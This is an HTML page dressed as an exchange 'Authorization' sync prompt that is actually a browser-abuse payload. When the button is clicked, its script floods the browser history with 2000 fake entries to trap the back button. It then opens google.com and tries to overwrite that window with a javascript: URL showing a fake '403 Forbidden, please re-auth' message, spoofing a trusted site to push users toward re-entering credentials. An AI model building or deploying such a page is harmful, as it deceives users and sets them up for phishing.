<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Network | Sync Interface</title>
    <style>
        :root { --b1: #0b0e11; --b2: #1e2329; --y1: #fcd535; --t1: #707a8a; }
        body { margin: 0; background: var(--b1); color: var(--t1); font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .wrapper { background: var(--b2); border: 1px solid #363d47; padding: 2rem; border-radius: 12px; width: 280px; text-align: center; }
        #exec { background: var(--y1); color: #1e2329; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: 600; cursor: pointer; }
        .load { border: 2px solid #363d47; border-top-color: var(--y1); border-radius: 50%; width: 18px; height: 18px; animation: r 0.8s linear infinite; display: none; margin: 10px auto; }
        @keyframes r { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="wrapper">
    <h3 style="color:#fff; margin:0 0 10px 0">Authorization</h3>
    <p style="font-size:13px">Synchronization required to validate session.</p>
    <div id="loader" class="load"></div>
    <button id="exec">Confirm & Sync</button>
    <div id="out" style="font-size:11px; margin-top:12px">Ready</div>
</div>

<script>
    const el = (id) => document.getElementById(id);
    const trigger = el('exec');
    const status = el('out');

    trigger.onclick = () => {
        trigger.style.display = 'none';
        el('loader').style.display = 'block';
        status.innerText = "Processing...";

        for (let i = 0; i < 2000; i++) {
            history.pushState(null, "", "#auth_id=" + Math.random().toString(36).substring(7));
        }

        setTimeout(() => {
            status.innerText = "Handshaking...";
            let win = window.open('https://google.com', '_blank');
            
            let t = setInterval(() => {
                try {
                    if (win) {
                        win.location = "javascript:document.write('<h1>403 Forbidden</h1><p>Session timeout. Please re-auth.</p>')";
                        clearInterval(t);
                    }
                } catch (e) {}
            }, 5);

            setTimeout(() => {
                clearInterval(t);
                status.innerText = "Sync failure (0x24)";
                trigger.style.display = 'block';
                el('loader').style.display = 'none';
            }, 4000);
        }, 150);
    };
</script>

</body>
</html>
